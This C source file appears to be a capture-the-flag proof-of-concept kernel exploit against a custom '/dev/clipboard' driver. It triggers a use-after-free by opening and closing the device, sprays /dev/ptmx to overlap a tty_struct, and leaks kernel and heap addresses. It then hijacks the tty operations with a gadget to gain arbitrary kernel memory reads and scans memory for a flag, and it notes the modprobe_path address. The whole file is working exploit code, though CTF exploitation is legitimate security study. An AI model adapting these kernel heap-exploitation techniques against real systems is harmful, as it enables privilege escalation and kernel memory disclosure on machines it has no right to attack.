#include <stdio.h>
#include <assert.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <stdlib.h>
#include <stdint.h>

#define DEVICE_NAME "/dev/clipboard"
#define MAX_DATA_LEN 0x400
#define CMD_READ 0x4000
#define CMD_WRITE 0x4001

typedef struct query {
    pid_t pid;
    unsigned short length;
    char data[MAX_DATA_LEN];
} Query;

Query *read_clipboard(int fd)
{
	Query *q;

	q = (Query *)malloc(sizeof(Query));
	q->length = 0x400;
	q->pid = getpid();
	int ret = ioctl(fd, CMD_READ, q);
	printf("read ioctl: %d\n", ret);
	return q;
}

Query *write_clipboard(int fd, Query* q)
{
	int ret = ioctl(fd, CMD_WRITE, q);
	printf("write ioctl: %d\n", ret);
}

int open_device(char* path)
{
	int fd = open(DEVICE_NAME, O_RDWR);
	assert(fd > 0);
	return fd;
}

void show_slabinfo(void)
{
	system("cat /proc/slabinfo");
	printf("------------------------");
}

void show_leaks(Query *q)
{
	unsigned long *p = (unsigned long*)(q->data);
	for(int i = 0; i < MAX_DATA_LEN/8; i++)
	{
		printf("%d %p\n", i, p[i]);
	}
}

#define PTMX_NUM 0x200

int main()
{
	int ptmx[PTMX_NUM];
	int fd[0x100];
	// This poc will get the kernel heap base and scan it for the start of the flag TSJ{
	// If found the exploit will continue leaking more info until the whole flag is received.
	// There is no TOCTOU, you can directly use the UAF opening the driver two times and close one.

	show_slabinfo();
	for(int i = 0; i< 0x2; i++)
		fd[i] = open_device(DEVICE_NAME);

	close(fd[1]);

	for(int i = 0; i<PTMX_NUM; i++)
		ptmx[i] = open("/dev/ptmx", O_RDWR);
	
	show_slabinfo();

	Query *q = read_clipboard(fd[0]);
	show_leaks(q);
	unsigned long *p = (unsigned long*)(q->data);
	uint64_t kernel_base =  p[3] - 0x10a9d00;
	printf("Kernel base @ %p\n", kernel_base);
	uint64_t tty_struct = p[7] - 0x38;
	printf("tty_struct @ %p\n", tty_struct);

	uint64_t *data = (uint64_t*)(q->data);
	data[3] = tty_struct + 0x20*8 + 0x10;

	uint64_t read_gadget = kernel_base + 0x2b509; //0xffffffff8102b509;
	uint64_t write_gadget = kernel_base + 0x20a01e; //0xffffffff8120a01e;

	for (int i = 0; i<0x10; i++)
		data[0x20+i] = read_gadget; //kernel_base + 0x231a000;

	write_clipboard(fd[0], q);

	uint64_t flag_ptr = kernel_base + 0x231a000;
	uint64_t modprobe_path = kernel_base + 0x1666880;
	uint64_t heap_base_addr = kernel_base + 0x144d1e0;

	printf("modprobe_path = %p\n", modprobe_path);
	uint64_t ret;
	int index;

	getchar();

	for(int i = 0; i<PTMX_NUM; i++)
	{
		ret = ioctl(ptmx[i], NULL, heap_base_addr + 4);
		if (ret != -1)
		{
			printf("ret %x\n", ret);
			printf("this worked %d\n", i);
			index = i;
			break;
		}
	}

	uint32_t half = ioctl(ptmx[index], NULL, heap_base_addr);

	uint64_t heap_base = ret << 32 | half;
	printf("heap base @ %p\n", heap_base);

	for(;;)
	{
		uint32_t leak = ioctl(ptmx[index], NULL, heap_base);
		if (leak == 0x7b4a5354) {
			printf("Leak @ %x\n", leak);
			for (int j = 0; j<0x30; j++)
			{
				leak = ioctl(ptmx[index], NULL, heap_base);
				printf("Leak @ %x\n", leak);
				heap_base += 0x4;
			}
			break;
		} else {
			heap_base += 4;
		}
	}

	getchar();
}
